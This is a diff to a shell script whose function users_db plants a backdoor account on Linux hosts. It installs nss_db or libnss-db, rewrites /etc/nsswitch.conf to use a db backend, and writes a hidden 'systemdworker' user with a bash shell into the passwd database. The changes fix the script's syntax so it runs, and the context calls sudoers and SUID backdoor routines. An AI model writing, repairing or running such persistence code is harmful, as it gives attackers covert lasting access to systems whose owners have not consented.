@@ -10,7 +10,7 @@ users_db() {
 
     # Add backdoored users if system supports that
 	if [ "`command -v  yum`" != "" ]; then
-		yum install -y nss_db #2>/dev/null >/dev/null
+		yum install -y nss_db; #2>/dev/null >/dev/null
 		if [ -f /var/db/Makefile ]; then
 			echo "Getting databases"
 			sed -i 's/files/db files/g' /etc/nsswitch.conf;
@@ -18,14 +18,15 @@ users_db() {
 			sed -i 's:/etc/passwd:passwd:g' /var/db/Makefile
     			echo "systemdworker:x:999:999:systemdworker:/home:/bin/bash" > /var/db/passwd
 			make -C /var/db 2>/dev/null >/dev/null
-    			[ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
+    			[ "$?" = "0" ] || echo "Downloading shadow.db failed..."
 			#GET_FILE "$1/passwd.db" "/var/db/passwd.db";
-			[ "$?" = "0" ] || echo "Downloading passwd.db failed..." 
+			[ "$?" = "0" ] || echo "Downloading passwd.db failed..."
 			#GET_FILE "$1/group.db" "/var/db/group.db";
-			[ "$?" = "0" ] || echo "Downloading group.db failed..." 
+			[ "$?" = "0" ] || echo "Downloading group.db failed..."
 			return 0;
+			fi;
 	elif [ "`command -v apt-get`" != "" ]; then
-		apt install -y  libnss-db;
+		apt install -y  libnss-db; #2>/dev/null >/dev/null
 		if [ -f /var/lib/misc/Makefile ]; then
                         echo "Getting databases"
                         sed -i 's/files/db files/g' /etc/nsswitch.conf;
@@ -39,6 +40,7 @@ users_db() {
                         #GET_FILE "$1/group.db" "/var/lib/misc/group.db";
                         [ "$?" = "0" ] || echo "Downloading group.db failed..." 
 			return 0;
+			fi;
 	else
 		echo "Cannot use database backdoor on this system";
 		return 1;
@@ -79,6 +81,5 @@ users() {
     echo "Sudoers added"
     users_sudo;
 	tools_suid;
-	
 };
 users;
